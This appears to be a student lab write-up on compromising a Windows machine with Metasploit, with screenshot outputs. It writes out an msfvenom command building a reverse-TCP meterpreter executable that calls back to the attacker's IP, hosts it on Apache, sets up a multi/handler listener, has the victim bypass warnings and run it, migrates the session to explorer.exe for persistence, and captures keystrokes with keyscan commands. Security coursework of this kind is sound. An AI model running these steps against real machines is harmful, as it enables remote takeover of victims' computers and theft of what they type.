# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/380c5c86-5104-4e5d-8227-3e204e09c34c)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/5b059106-b66e-44c9-a916-259bc7dcafa3)


copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/4823490b-dada-4df0-8328-5034db68f512)



Start apache server
sudo systemctl apache2 start

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/95013789-b3a0-4846-a536-f98d7eababee)


Check the status of apache2

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/9e155838-2d7e-4a3a-9943-ec1e03ed4ceb)



## Invoke msfconsole:

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/611dab41-271b-41c4-963c-79ab268f5ba0)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/75693553-5d75-43cc-baee-9872612ac782)



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/21c67f07-6fb5-41e5-be7b-308875d7c7fb)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/44115e3b-1f5d-439c-9272-1a31f3a4fc51)



Bypass any warning boxes, double-click the file, and allow it to run.

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/0a8cd3b5-ebab-41ee-80bc-d6e49085e65b)


On kali give the command exploit

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/0b042926-68d1-4ed8-a72a-d29a18c84d9d)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/b00f6031-f1f3-4e18-afac-c0ca46254fb2)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/7611f8c4-36a1-431f-9944-3017871507fc)

## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/5d233f8a-9732-4799-ac68-57d026b1c955)

![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/f5cbcf74-46e4-4b9f-ab0c-48a39f88d06d)

keyscan_dump	Shows the keystrokes captured so far

## OUTPUT:
![image](https://github.com/Bharath745/Compromising-windows-using-Metasploit/assets/94508354/74ba8d8e-077e-4033-93f2-05728297d785)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
